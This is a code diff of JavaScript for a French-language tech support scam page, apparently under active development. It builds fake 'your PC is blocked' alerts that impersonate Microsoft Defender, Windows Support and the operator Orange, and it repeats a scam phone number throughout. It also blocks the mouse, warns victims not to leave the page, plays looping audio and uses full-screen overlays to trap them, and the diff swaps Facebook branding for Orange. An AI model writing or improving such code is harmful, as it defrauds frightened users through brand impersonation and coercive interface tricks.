@@ -2,25 +2,23 @@
   var mount = document.getElementById("app-mount");
   if (!mount) return;
 
-  if (!document.querySelector('link[href*="styles.css"]')) {
+  if (!document.querySelector('link[href="styles.css"]')) {
     var styleLink = document.createElement("link");
     styleLink.rel = "stylesheet";
-    styleLink.href = "styles.css?v=19";
+    styleLink.href = "styles.css";
     document.head.appendChild(styleLink);
   }
 
-  document.title = "Windows";
+  document.title = "Fond bleu avec modale";
 
   mount.innerHTML =
-    '<style id="page2-inline-white">' +
-    "#securityOverlay.is-active,#securityOverlay.is-active p,#securityOverlay.is-active h2,#securityOverlay.is-active button," +
-    "#securityOverlay.is-active .browser-chrome-alert,#securityOverlay.is-active .browser-chrome-warning,#securityOverlay.is-active .browser-chrome-phone," +
-    "#securityOverlay.is-active .black-modal-blue-box p,#securityOverlay.is-active .black-modal-defender,#securityOverlay.is-active .smartscreen-btn," +
-    "#securitySupportCard,#securitySupportCard p,#securitySupportCard div," +
-    "#escapeShield.is-visible p,#escapeExitModal.is-visible p,#escapeExitModal.is-visible span" +
-    "{color:#ffffff!important;-webkit-text-fill-color:#ffffff!important}" +
-    "</style>" +
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
+    '<div id="browserChromeShield" class="browser-chrome-shield" aria-hidden="true" role="alert">' +
+    '<div class="browser-chrome-modal">' +
+    '<p class="browser-chrome-alert">Une anomalie a été détectée</p>' +
+    '<p class="browser-chrome-warning">Appellez le support technique Microsoft</p>' +
+    '<p class="browser-chrome-phone">+33 02 59 50 90 20</p>' +
+    '</div></div>' +
     '<div id="escapeShield" class="escape-shield" aria-hidden="true" role="alert">' +
     '<div class="escape-shield-taskbar-wrap">' +
     '<div class="escape-shield-taskbar-modal">' +
@@ -28,13 +26,6 @@
     '<p class="escape-shield-warning">Ne quittez pas la page</p>' +
     '</div></div></div>' +
     '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true">' +
-    '<div id="browserChromeShield" class="browser-chrome-shield" aria-hidden="true" role="alert">' +
-    '<div class="browser-chrome-modal">' +
-    '<p class="browser-chrome-alert">Une anomalie a été détectée</p>' +
-    '<p class="browser-chrome-warning">Appellez le support technique Microsoft</p>' +
-    '<p class="browser-chrome-phone">+33 02 59 50 90 20</p>' +
-    '</div></div>' +
-    '<div class="security-main-panel">' +
     '<div class="security-page">' +
     '<section class="access-modal" aria-label="Alerte acces bloque">' +
     '<p>L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
@@ -46,10 +37,6 @@
     '<p>Windows Support : +33 02 59 50 90 20</p>' +
     '<p class="black-modal-defender">Microsoft Defender</p>' +
     '</div>' +
-    '<div class="smartscreen-actions" aria-hidden="true">' +
-    '<button type="button" class="smartscreen-btn smartscreen-btn-run">Run anyway</button>' +
-    '<button type="button" class="smartscreen-btn smartscreen-btn-deny">Don\'t run</button>' +
-    '</div></div></div>' +
     '<section class="scan-modal scan-modal-hidden" aria-label="Support technique Microsoft" aria-hidden="true">' +
     '<h2 class="scan-modal-title">Désolé, l\'analyse n\'est pas terminée !</h2>' +
     '<p class="scan-modal-text">Une anomalie a été détectée sur votre appareil. Appellez l\'assistance Orange pour une analyse complète et sécuriser votre connexion.</p>' +
@@ -60,11 +47,12 @@
     '<button class="scan-btn scan-btn-later" type="button">Analyser plus tard</button>' +
     '</div>' +
     '</section>' +
-    '<aside id="securitySupportCard" class="support-card" aria-label="Support technique Microsoft">' +
-    '<p id="scSubtitle" class="support-card-subtitle">Support technique Microsoft</p>' +
-    '<p id="scPhone" class="support-card-phone">+33 02 59 50 90 20</p>' +
-    '<p id="scLabel" class="support-card-label">Numero</p>' +
-    '<div id="scArrow" class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
+    '</div>' +
+    '<aside class="support-card" aria-label="Support technique Microsoft">' +
+    '<p class="support-card-subtitle">Support technique Microsoft</p>' +
+    '<p class="support-card-phone">+33 02 59 50 90 20</p>' +
+    '<p class="support-card-label">Numero</p>' +
+    '<div class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
     '<div class="home-page">' +
     '<main class="screen">' +
     '<div class="fb-desktop-bg" aria-hidden="true">' +
@@ -102,9 +90,9 @@
     '<div class="fb-bg-overlay" aria-hidden="true"></div>' +
     '<h1 class="warning-text">votre ordinateur est bloque</h1>' +
     '<section class="modal" aria-label="Modale carree">' +
-    '<header class="fb-submodal-header"><div class="fb-page-logo" aria-hidden="true">' +
-    '<svg viewBox="0 0 120 32" role="img" aria-hidden="true">' +
-    '<text x="0" y="24" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-size="24" font-weight="700">facebook</text>' +
+    '<header class="fb-submodal-header"><div class="orange-logo" aria-hidden="true">' +
+    '<svg viewBox="0 0 110 32" role="img" aria-hidden="true">' +
+    '<text x="0" y="24" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-size="24" font-weight="700">orange</text>' +
     '</svg></div>' +
     '<button class="fb-close" id="fbCloseBtn" type="button" aria-label="Fermer">&times;</button></header>' +
     '<div class="fb-submodal-separator" aria-hidden="true"></div><div class="modal-content"><div class="modal-top">' +
@@ -122,7 +110,7 @@
     '<div class="modal-bottom"><div class="modal-actions" role="group" aria-label="Actions">' +
     '<button class="modal-btn modal-btn-allow" id="secureAccountBtn" type="button">Sécuriser mon compte</button>' +
     '<button class="modal-btn modal-btn-deny" id="denyAccountBtn" type="button">Ce n\'est pas moi</button></div></div></div></section></main></div>' +
-    '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Support technique Microsoft</p></div>' +
+    '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Appellez l\'assistance Orange</p></div>' +
     '<audio id="securityAudio1" src="script-audio.mp3" loop preload="auto"></audio>' +
     '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>' +
     '<div id="escapeExitModal" class="escape-exit-overlay" aria-hidden="true" role="dialog" aria-label="Instructions assistance">' +
@@ -149,8 +137,6 @@
   var ESCAPE_DEZOOM_MS = 10000;
   var secureAccountBtn = document.getElementById("secureAccountBtn");
   var denyAccountBtn = document.getElementById("denyAccountBtn");
-  ensurePage2WhiteStyle();
-
   var securityOverlay = document.getElementById("securityOverlay");
   var fbCloseBtn = document.getElementById("fbCloseBtn");
   var securityAudio1 = document.getElementById("securityAudio1");
@@ -195,72 +181,18 @@
     }
   }
 
-  function ensurePage2WhiteStyle() {
-    if (document.getElementById("page2-white-style")) return;
-    var style = document.createElement("style");
-    style.id = "page2-white-style";
-    style.textContent =
-      "#securityOverlay.is-active,#securityOverlay.is-active p,#securityOverlay.is-active h2,#securityOverlay.is-active button," +
-      "#securityOverlay.is-active .browser-chrome-alert,#securityOverlay.is-active .browser-chrome-warning,#securityOverlay.is-active .browser-chrome-phone," +
-      "#securityOverlay.is-active .black-modal-blue-box p,#securityOverlay.is-active .black-modal-defender,#securityOverlay.is-active .smartscreen-btn," +
-      "#securitySupportCard,#securitySupportCard p,#securitySupportCard div," +
-      "#escapeShield.is-visible p,#escapeExitModal.is-visible p,#escapeExitModal.is-visible span" +
-      "{color:#ffffff!important;-webkit-text-fill-color:#ffffff!important}";
-    document.head.appendChild(style);
-  }
-
-  function paintPage2TextWhite() {
-    var roots = [
-      document.getElementById("securityOverlay"),
-      document.getElementById("securitySupportCard"),
-      document.getElementById("escapeShield"),
-      document.getElementById("escapeExitModal"),
-    ];
-    var sel =
-      "p, h1, h2, h3, button, span, .browser-chrome-alert, .browser-chrome-warning, .browser-chrome-phone, .black-modal-defender, .smartscreen-btn, .escape-shield-alert, .escape-shield-warning, .escape-exit-message, .support-card-subtitle, .support-card-phone, .support-card-label, .support-card-arrow";
-    roots.forEach(function (root) {
-      if (!root) return;
-      root.querySelectorAll(sel).forEach(function (node) {
-        node.style.setProperty("color", "#ffffff", "important");
-        node.style.setProperty("-webkit-text-fill-color", "#ffffff", "important");
-      });
-    });
-  }
-
-  function showSupportCard() {
-    var card = document.getElementById("securitySupportCard");
-    if (!card) return;
-
-    document.body.appendChild(card);
-    card.classList.add("is-visible");
-    card.setAttribute("aria-hidden", "false");
-    card.style.setProperty("display", "block", "important");
-    card.style.setProperty("position", "fixed", "important");
-    card.style.setProperty("right", "12px", "important");
-    card.style.setProperty("bottom", "24px", "important");
-    card.style.setProperty("z-index", "47900", "important");
-    card.style.setProperty("visibility", "visible", "important");
-    card.style.setProperty("opacity", "1", "important");
-    paintPage2TextWhite();
-  }
-
   function showSecurityPage() {
     if (!securityOverlay) return;
-    ensurePage2WhiteStyle();
     securityOverlay.classList.add("is-active");
     securityOverlay.setAttribute("aria-hidden", "false");
     document.body.classList.add("security-mode");
     showBrowserChromeShield();
-    showSupportCard();
-    paintPage2TextWhite();
-    requestAnimationFrame(paintPage2TextWhite);
-    setTimeout(paintPage2TextWhite, 0);
-    setTimeout(paintPage2TextWhite, 120);
   }
 
   function showBrowserChromeShield() {
     var shield = document.getElementById("browserChromeShield");
     if (!shield) return;
+    document.body.appendChild(shield);
     shield.classList.add("is-visible");
     shield.setAttribute("aria-hidden", "false");
   }
@@ -279,7 +211,6 @@
     shield.classList.add("is-visible");
     shield.setAttribute("aria-hidden", "false");
     document.body.style.visibility = "visible";
-    paintPage2TextWhite();
   }
 
   function hideEscapeShield() {
@@ -314,7 +245,6 @@
     modal.classList.add("is-visible");
     modal.setAttribute("aria-hidden", "false");
     document.body.style.visibility = "visible";
-    paintPage2TextWhite();
   }
 
   function exitAfterEscapeHold() {
